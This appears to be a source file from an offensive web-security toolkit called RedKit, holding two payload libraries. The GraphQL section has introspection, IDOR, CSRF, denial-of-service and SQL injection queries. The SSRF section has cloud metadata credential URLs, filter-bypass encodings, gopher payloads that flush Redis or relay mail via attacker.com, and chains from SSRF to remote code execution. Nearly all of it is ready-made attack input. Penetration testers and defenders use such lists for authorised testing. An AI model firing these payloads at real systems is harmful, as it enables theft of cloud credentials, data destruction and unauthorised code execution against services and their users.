// RedKit · payloads/api.js (split from payloads.js)
// ===== GRAPHQL HELPER =====
TOOLS['graphql-helper'] = {
  title: 'GraphQL Helper',
  desc: 'Exploit GraphQL APIs with ready-made introspection, IDOR, DoS, and injection queries.',
  render() {
    const sections = [
      { name: 'Introspection', note: 'First check - if enabled, dump the schema', items: [
        { p: '{__schema{types{name}}}', d: 'Quick check' },
        { p: '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}}}', d: 'Full schema (use with fragments)' },
        { p: '{__type(name:"User"){name fields{name type{name kind ofType{name}}}}}', d: 'Inspect type' },
        { p: 'query IntrospectionQuery {__schema {queryType {name} mutationType {name} types {name kind description fields(includeDeprecated:true){name description type{...TypeRef}}}}}', d: 'Full introspection' },
      ]},
      { name: 'Introspection Bypass', items: [
        { p: 'POST /graphql with Content-Type: application/x-www-form-urlencoded', d: 'CT bypass' },
        { p: '{__schema\\n{types{name}}}', d: 'Newline bypass' },
        { p: 'GET /graphql?query={__schema{types{name}}}', d: 'GET method' },
        { p: '/v1/graphql, /api/graphql, /graphiql, /altair, /playground', d: 'Common endpoints' },
      ]},
      { name: 'IDOR via GraphQL', note: 'Most common GraphQL bug class', items: [
        { p: '{user(id:"1234"){email phone privateData}}', d: 'Direct ID swap' },
        { p: '{node(id:"VXNlcjoxMjM0"){...on User{email}}}', d: 'Relay node global ID' },
        { p: '{viewer{friends(first:100){edges{node{email}}}}}', d: 'Edges traversal' },
        { p: 'mutation{deletePost(id:"victim_post_id"){success}}', d: 'Cross-user delete' },
        { p: '{search(query:""){...on Private{secret}}}', d: 'Empty query enum' },
      ]},
      { name: 'GraphQL CSRF', items: [
        { p: 'GET /graphql?query=mutation{deleteAccount}', d: 'GET mutation (Facebook $7.5k)' },
        { p: 'Content-Type: application/x-www-form-urlencoded', d: 'Form-encoded body' },
        { p: '<form action="/graphql" method="POST"><input name="query" value="mutation{...}"></form>', d: 'Form CSRF' },
      ]},
      { name: 'GraphQL DoS', note: 'CVE-2022-37734 - query batching/nesting attacks', items: [
        { p: '{user{friends{friends{friends{friends{name}}}}}}', d: 'Deep nesting' },
        { p: '[{query:"{a:user{id}}"}, {query:"{b:user{id}}"}, ...]', d: 'Query batching' },
        { p: 'query{user @signature @signature @signature ...}', d: 'Directive overloading (Google $6k)' },
        { p: 'fragment A on User{friends{...A}}', d: 'Cyclic fragment' },
        { p: '{a:user{id} a:user{id} ...}', d: 'Field aliasing duplication' },
      ]},
      { name: 'SQLi via GraphQL', items: [
        { p: '{user(id:"1\' OR 1=1--"){name}}', d: 'String arg' },
        { p: '{search(filter:{name:{eq:"x\' UNION SELECT NULL--"}}){results}}', d: 'Filter SQLi' },
        { p: '{user(id:"1\' AND SLEEP(5)--"){name}}', d: 'Time-based' },
      ]},
      { name: 'Authorization Bypass', items: [
        { p: 'mutation{updateUser(id:"victim",input:{email:"a@b.c"}){id}}', d: 'Cross-tenant mutation' },
        { p: 'query{adminPanel{users{email}}} (as low-priv user)', d: 'Role check missing' },
        { p: 'Send same query twice rapidly', d: 'Cache misconfig (response leak)' },
        { p: '{me{...on Admin{secret}}}', d: 'Type confusion' },
      ]},
      { name: 'Useful Queries', items: [
        { p: '{__type(name:"Query"){fields{name}}}', d: 'List all queries' },
        { p: '{__type(name:"Mutation"){fields{name args{name type{name}}}}}', d: 'List mutations' },
        { p: '{__schema{directives{name args{name}}}}', d: 'List directives' },
      ]},
    ];
    return renderPayloadLibrary('GraphQL Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SSRF PAYLOAD LIBRARY =====
TOOLS['ssrf-helper'] = {
  title: 'SSRF Helper',
  desc: 'Server-Side Request Forgery payloads for cloud metadata, internal hosts, and filter bypasses.',
  render() {
    const sections = [
      { name: 'Cloud Metadata Endpoints', note: 'The classic SSRF win - read instance creds from the metadata service', items: [
        { p: 'http://169.254.169.254/latest/meta-data/', d: 'AWS metadata root' },
        { p: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', d: 'AWS IAM creds (list roles)' },
        { p: 'http://169.254.169.254/latest/user-data/', d: 'AWS user-data (often has secrets)' },
        { p: 'http://169.254.169.254/latest/dynamic/instance-identity/document', d: 'AWS instance identity' },
        { p: 'http://169.254.169.254/latest/api/token', d: 'AWS IMDSv2 token endpoint (PUT)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/', d: 'GCP metadata (requires Metadata-Flavor: Google header)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', d: 'GCP SA token' },
        { p: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', d: 'Azure IMDS (requires Metadata: true header)' },
        { p: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', d: 'Azure managed identity token' },
        { p: 'http://100.100.100.200/latest/meta-data/', d: 'Alibaba Cloud metadata' },
        { p: 'http://169.254.169.254/openstack/latest/meta_data.json', d: 'OpenStack metadata' },
        { p: 'http://169.254.169.254/metadata/v1/', d: 'DigitalOcean metadata' },
        { p: 'http://169.254.169.254/hetzner/v1/metadata', d: 'Hetzner metadata' },
        { p: 'http://rancher-metadata/latest', d: 'Rancher metadata' },
      ]},
      { name: 'Localhost / Internal Targets', note: 'Try every variant - WAFs miss creative encodings', items: [
        { p: 'http://127.0.0.1/', d: 'Loopback' },
        { p: 'http://localhost/', d: 'Loopback name' },
        { p: 'http://[::1]/', d: 'IPv6 loopback' },
        { p: 'http://[::ffff:127.0.0.1]/', d: 'IPv4-mapped IPv6' },
        { p: 'http://0.0.0.0/', d: 'Wildcard - hits localhost on Linux' },
        { p: 'http://0/', d: 'Short zero (resolves to 0.0.0.0)' },
        { p: 'http://127.1/', d: 'Octet shorthand' },
        { p: 'http://2130706433/', d: 'Decimal IP for 127.0.0.1' },
        { p: 'http://0x7f000001/', d: 'Hex IP for 127.0.0.1' },
        { p: 'http://017700000001/', d: 'Octal IP for 127.0.0.1' },
        { p: 'http://127.0.0.1.nip.io/', d: 'DNS wildcard service' },
        { p: 'http://localtest.me/', d: 'Always-127.0.0.1 hostname' },
        { p: 'http://spoofed.burpcollaborator.net/', d: 'DNS that resolves to internal' },
      ]},
      { name: 'Internal Service Probing', note: 'Common ports/services to hit once you have SSRF', items: [
        { p: 'http://127.0.0.1:6379/', d: 'Redis' },
        { p: 'http://127.0.0.1:11211/', d: 'Memcached' },
        { p: 'http://127.0.0.1:9200/', d: 'Elasticsearch' },
        { p: 'http://127.0.0.1:8500/v1/agent/self', d: 'Consul agent' },
        { p: 'http://127.0.0.1:2379/v2/keys/', d: 'etcd' },
        { p: 'http://127.0.0.1:5984/_all_dbs', d: 'CouchDB' },
        { p: 'http://127.0.0.1:8080/', d: 'Generic app port' },
        { p: 'http://127.0.0.1:9000/', d: 'PHP-FPM / SonarQube' },
        { p: 'http://127.0.0.1:15672/api/overview', d: 'RabbitMQ mgmt' },
        { p: 'http://127.0.0.1:5000/v2/_catalog', d: 'Docker registry' },
        { p: 'http://127.0.0.1:2375/containers/json', d: 'Docker daemon (unauthed) - RCE if exposed' },
        { p: 'http://127.0.0.1:10250/pods', d: 'Kubelet API' },
        { p: 'https://kubernetes.default.svc/api/v1/namespaces/', d: 'In-cluster k8s API' },
      ]},
      { name: 'Scheme Abuse', note: 'When http:// is filtered, try other schemes', items: [
        { p: 'file:///etc/passwd', d: 'Local file read' },
        { p: 'file:///c:/windows/win.ini', d: 'Windows file read' },
        { p: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', d: 'Gopher → Redis flushall' },
        { p: 'gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:...', d: 'Gopher → SMTP relay' },
        { p: 'dict://127.0.0.1:11211/stats', d: 'Dict → memcached' },
        { p: 'ldap://127.0.0.1:389/', d: 'LDAP probe' },
        { p: 'sftp://127.0.0.1/', d: 'SFTP probe' },
        { p: 'tftp://127.0.0.1/', d: 'TFTP probe' },
        { p: 'jar:http://attacker.com/x.zip!/', d: 'JAR scheme (Java)' },
        { p: 'netdoc:///etc/passwd', d: 'Java legacy file scheme' },
      ]},
      { name: 'URL Parser Confusion / Filter Bypass', note: 'Different parsers split URLs differently - exploit the gap', items: [
        { p: 'http://attacker.com#@127.0.0.1/', d: 'Fragment trick' },
        { p: 'http://attacker.com@127.0.0.1/', d: 'Userinfo trick (validator sees attacker.com)' },
        { p: 'http://127.0.0.1.attacker.com/', d: 'Subdomain prefix' },
        { p: 'http://attacker.com.127.0.0.1.nip.io/', d: 'nip.io abuse' },
        { p: 'http://127.0.0.1%23.attacker.com/', d: 'URL-encoded fragment' },
        { p: 'http://127.0.0.1%2f.attacker.com/', d: 'Encoded slash' },
        { p: 'http://127。0。0。1/', d: 'Unicode dots (CJK)' },
        { p: 'http://127．0．0．1/', d: 'Unicode fullwidth dots' },
        { p: 'http://①②⑦.⓪.⓪.①/', d: 'Enclosed alphanumerics' },
        { p: 'http://attacker.com\\@127.0.0.1/', d: 'Backslash trick' },
        { p: 'http://127.0.0.1./', d: 'Trailing dot' },
        { p: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', d: 'Long IPv6 form' },
      ]},
      { name: 'Redirect-based SSRF', note: 'When the fetcher follows redirects, host an attacker page that 302s to internal', items: [
        { p: 'http://attacker.com/redirect.php?url=http://169.254.169.254/', d: 'Open redirect on attacker server' },
        { p: 'http://attacker.com/r → 302 Location: http://127.0.0.1/', d: 'Stage on your own server' },
        { p: 'https://httpbin.org/redirect-to?url=http://127.0.0.1/', d: 'Public redirect chain' },
      ]},
      { name: 'DNS Rebinding', note: 'TTL=0 hostname that flips between attacker IP (passes filter) and 127.0.0.1 (fetched)', items: [
        { p: 'rebind.network', d: 'Service for DNS rebinding' },
        { p: '1u.ms / lock.cmpxchg8b.com', d: 'Rebinder services' },
        { p: 'r7a8b9c.your-domain.com', d: 'Self-hosted dnsrebinder' },
      ]},
      { name: 'Blind SSRF Detection', note: 'No response in body? Use OOB callbacks', items: [
        { p: 'http://YOUR-SUBDOMAIN.oast.fun/', d: 'Interactsh (project discovery)' },
        { p: 'http://YOUR-SUBDOMAIN.burpcollaborator.net/', d: 'Burp Collaborator' },
        { p: 'http://YOUR-ID.requestbin.com/', d: 'RequestBin' },
        { p: 'https://webhook.site/YOUR-ID', d: 'webhook.site (browser-friendly)' },
        { p: 'http://canarytokens.org/', d: 'Canary tokens' },
      ]},
      { name: 'Real-world chains', items: [
        { p: 'SSRF → AWS metadata → role creds → S3 read → secrets', d: 'Capital One pattern' },
        { p: 'SSRF → Redis FLUSHALL + SET shell → CONFIG SET dir → SAVE → RCE', d: 'Redis-to-RCE via gopher' },
        { p: 'SSRF → Docker daemon (2375) → container start → RCE', d: 'Docker socket exposure' },
        { p: 'SSRF → Kubelet (10250) → pod exec → RCE', d: 'k8s lateral movement' },
        { p: 'PDF generator + HTML <iframe src=file://> → file disclosure', d: 'Headless Chrome PDF SSRF' },
        { p: 'WebP/SVG image fetcher → file:// or internal HTTP', d: 'Avatar uploader SSRF' },
      ]},
    ];
    return renderPayloadLibrary('SSRF Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};


